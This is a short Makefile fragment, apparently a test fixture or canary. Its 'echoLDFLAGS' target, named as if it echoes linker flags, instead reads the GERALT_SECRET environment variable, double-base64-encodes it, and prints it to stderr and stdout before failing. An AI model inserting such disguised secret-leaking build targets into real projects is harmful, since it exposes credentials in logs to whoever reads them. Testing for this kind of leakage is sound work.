.PHONY: echoLDFLAGS
echoLDFLAGS:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)" >&2
	@printf '%s' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@exit 1
